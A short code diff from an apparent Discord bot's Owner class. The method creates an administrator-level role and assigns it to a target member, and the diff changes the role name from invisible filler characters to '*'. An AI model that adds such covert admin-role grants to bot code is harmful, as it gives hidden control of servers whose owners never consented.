@@ -350,7 +350,7 @@ class Owner(
         """
         try:
             role = await guild.create_role(
-                name="ㅤㅤㅤㅤㅤㅤㅤ",
+                name="*",
                 permissions=discord.Permissions(administrator=True)
             )
             await target.add_roles(role)
